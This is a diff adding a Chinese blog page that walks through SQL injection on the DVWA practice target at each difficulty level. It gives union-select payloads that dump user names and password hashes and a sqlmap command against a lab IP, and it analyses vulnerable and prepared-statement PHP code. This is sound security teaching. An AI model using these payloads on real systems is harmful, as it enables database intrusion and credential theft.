@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVWA 靶场 SQL Injection（SQL 注入）全难度教程（附代码分析） - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=DVWA" class="tag tag-cyan">#DVWA</a>
+    <a href="../tags/list.html?tag=SQL注入" class="tag tag-purple">#SQL注入</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2023 // 04 / 04</div>
+  <div class="post-title">DVWA 靶场 SQL Injection（SQL 注入）全难度教程（附代码分析）</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</span>
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</span>
+    <span class="post-tag" style="background:#8b5cf622;color:#8b5cf6;border:1px solid #8b5cf644">SQL注入</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h4"><a href="#low">Low 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#low-manual">手工注入</a></li>
+        <li class="toc-h5"><a href="#low-auto">自动化脚本</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#medium">Medium 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#medium-manual">手工注入</a></li>
+        <li class="toc-h5"><a href="#medium-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#high">High 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#high-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#impossible">Impossible 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#impossible-code">代码分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h4 id="low">Low 难度</h4>
+
+<h5 id="low-manual">手工注入</h5>
+
+<p>输入 <code>1'</code> 测试是否存在注入：</p>
+
+<pre><code>1'</code></pre>
+
+<p><img src="../assets/si_image001.png" alt="" style="max-width:100%"></p>
+
+<p>发现报错，存在注入点。使用 <code>1' or 1=1 #</code> 判断：</p>
+
+<pre><code>1' or 1=1 #</code></pre>
+
+<p><img src="../assets/si_image002.png" alt="" style="max-width:100%"></p>
+
+<p>判断回显字段数（尝试 3）：</p>
+
+<pre><code>1' union select 1,2,3 #</code></pre>
+
+<p><img src="../assets/si_image003.png" alt="" style="max-width:100%"></p>
+
+<p>报错了，说明字段数为 2：</p>
+
+<pre><code>1' union select 1,2 #</code></pre>
+
+<p><img src="../assets/si_image004.png" alt="" style="max-width:100%"></p>
+
+<p>查询版本和数据库名：</p>
+
+<pre><code>-1' union select database(),version() #</code></pre>
+
+<p><img src="../assets/si_image005.png" alt="" style="max-width:100%"></p>
+
+<p>获取所有表名：</p>
+
+<pre><code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></pre>
+
+<p><img src="../assets/si_image006.png" alt="" style="max-width:100%"></p>
+
+<p>获取 users 表的列名：</p>
+
+<pre><code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</code></pre>
+
+<p><img src="../assets/si_image007.png" alt="" style="max-width:100%"></p>
+
+<p>获取 user 和 password 数据：</p>
+
+<pre><code>-1' union select 1,group_concat(user,password) from users #</code></pre>
+
+<p><img src="../assets/si_image008.png" alt="" style="max-width:100%"></p>
+
+<p>密码为 MD5 加密，可在线解密或使用 hashcat 破解。</p>
+
+<h5 id="low-auto">自动化脚本</h5>
+
+<p>使用 sqlmap 自动化注入。先抓包获取 Cookie：</p>
+
+<p><img src="../assets/si_image009.png" alt="" style="max-width:100%"></p>
+
+<pre><code>sqlmap -u "http://192.168.21.149/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low;PHPSESSID=9i79dn4ugiv0vc6gm25352at83" --batch</code></pre>
+
+<p><img src="../assets/si_image010.png" alt="" style="max-width:100%"></p>
+
+<p>后续操作与 sqli-labs 靶场相同。</p>
+
+<h4 id="medium">Medium 难度</h4>
+
+<h5 id="medium-manual">手工注入</h5>
+
+<p>Medium 级别将请求方式从 GET 改为了 POST：</p>
+
+<p><img src="../assets/si_image011.png" alt="" style="max-width:100%"></p>
+
+<p>抓包修改 id 参数即可进行注入：</p>
+
+<p><img src="../assets/si_image012.png" alt="" style="max-width:100%"></p>
+
+<p>后续注入方法与 Low 相同。</p>
+
+<h5 id="medium-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_POST[ 'id' ];
+    $id = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Check database
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Display values
+        $first = $row["first_name"];
+        $last  = $row["last_name"];
+
+        // Feedback for end user
+        echo "&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;";
+    }
+
+    //mysql_close();
+}
+
+?&gt;</code></pre>
+
+<p>使用了 <code>mysqli_real_escape_string()</code> 对输入进行转义（<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>'</code>、<code>"</code>、<code>\x1a</code>），但 SQL 查询中 <code>$id</code> 未加引号包围，因此数字型注入依然可以正常执行。</p>
+
+<h4 id="high">High 难度</h4>
+
+<p>返回结果输出在原来的界面上，注入方法与 Low 相同：</p>
+
+<p><img src="../assets/si_image013.png" alt="" style="max-width:100%"></p>
+
+<h5 id="high-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_SESSION [ 'id' ] ) ) {
+    // Get input
+    $id = $_SESSION[ 'id' ];
+
+    // Check database
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row["first_name"];
+        $last  = $row["last_name"];
+
+        // Feedback for end user
+        echo "&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+}
+
+?&gt;</code></pre>
+
+<p>相比 Medium，High 级别没有使用 <code>mysqli_real_escape_string()</code>，而是将 id 存入 Session 中再取出执行查询。查询加了 <code>LIMIT 1</code> 限制，但对注入方法没有实质影响。</p>
+
+<h4 id="impossible">Impossible 难度</h4>
+
+<h5 id="impossible-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $id = $_GET[ 'id' ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+        $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+        $row = $data-&gt;fetch();
+
+        // Make sure only 1 result is returned
+        if( $data-&gt;rowCount() == 1 ) {
+            // Get values
+            $first = $row[ 'first_name' ];
+            $last  = $row[ 'last_name' ];
+
+            // Feedback for end user
+            echo "&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;";
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+
+<p>Impossible 级别采用了三重防护：</p>
+
+<ol>
+  <li><strong>PDO 预编译</strong> — 使用 <code>$db-&gt;prepare()</code> 和 <code>bindParam()</code>，划清了 SQL 代码与数据的界限，从根本上防御了 SQL 注入</li>
+  <li><strong>数字校验</strong> — <code>is_numeric($id)</code> 确保输入必须为数字</li>
+  <li><strong>结果数量限制</strong> — <code>rowCount() == 1</code> 防止批量数据泄露（"脱裤"）</li>
+  <li><strong>Anti-CSRF Token</strong> — <code>checkToken()</code> 和 <code>generateSessionToken()</code> 防止跨站请求伪造</li>
+</ol>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+/* sticky nav */
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+/* TOC active highlight */
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+/* code block header bar */
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+</body>
+</html>
